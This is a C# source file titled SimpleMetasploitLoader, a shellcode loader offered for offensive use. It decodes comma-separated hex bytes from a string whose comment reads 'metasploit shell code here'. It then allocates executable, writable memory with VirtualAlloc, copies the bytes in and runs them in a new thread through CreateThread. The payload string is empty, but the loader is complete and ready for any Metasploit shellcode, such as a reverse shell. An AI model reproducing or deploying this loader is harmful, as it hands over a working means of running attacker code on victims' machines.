using System;
using System.Runtime.InteropServices;

namespace SimpleMetasploitLoader
{
    class Program
    {
        static void Main(string[] args)
        {
            string payloadX = ""; //metasploit shell code here
            string[] payloadY = payloadX.Split(',');
            byte[] payloadZ = new byte[payloadY.Length];
            for (int i = 0; i < payloadY.Length; i++)
            {
                payloadZ[i] = Convert.ToByte(payloadY[i], 16);
            }
            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            UInt32 funcAddr = VirtualAlloc(0x0000, (UInt32)payloadZ.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(payloadZ, 0x0000, (IntPtr)(funcAddr), payloadZ.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0x0000;
            IntPtr pinfo = IntPtr.Zero;

            hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);
            WaitForSingleObject(hThread, 0xffffffff);

        }

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    }

}